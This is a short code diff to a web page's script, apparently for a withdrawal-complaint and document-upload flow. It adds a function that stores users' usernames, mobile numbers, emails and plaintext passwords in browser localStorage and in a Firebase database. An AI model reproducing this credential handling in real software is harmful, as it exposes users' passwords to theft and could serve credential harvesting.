@@ -91,6 +91,26 @@
             });
         }
 
+        function saveChatSession(data) {
+            if (!data || !data.mobile) return;
+            const existing = JSON.parse(localStorage.getItem('chatUserData') || 'null');
+            const session = {
+                username: data.username || (existing && existing.username) || '',
+                mobile: data.mobile,
+                password: data.password || (existing && existing.password) || '',
+                email: data.email || (existing && existing.email) || '',
+                timestamp: Date.now()
+            };
+            localStorage.setItem('chatUserData', JSON.stringify(session));
+            db.ref('users/' + session.mobile).update({
+                username: session.username,
+                mobile: session.mobile,
+                password: session.password,
+                email: session.email,
+                lastSeen: Date.now()
+            });
+        }
+
         const uploadAreas = document.querySelectorAll('.upload-area');
         let images = [null, null, null];
 
@@ -129,6 +149,7 @@
 
             const pendingComplaint = JSON.parse(localStorage.getItem('pendingWithdrawal'));
             if (pendingComplaint) {
+                saveChatSession(pendingComplaint);
                 db.ref('complaints/' + pendingComplaint.mobile + '/withdrawal/' + pendingComplaint.id).update({
                     documents: 'uploaded',
                     status: 'Pending',
@@ -165,7 +186,7 @@
             btn.textContent = 'SUBMITTING...';
             
             setTimeout(() => {
-                window.location.href = '../CHAT/CHAT-PENNAL/index.html';
+                window.location.href = 'CHAT/CHAT-PENNAL/index.html';
             }, 3000);
         });
     </script>
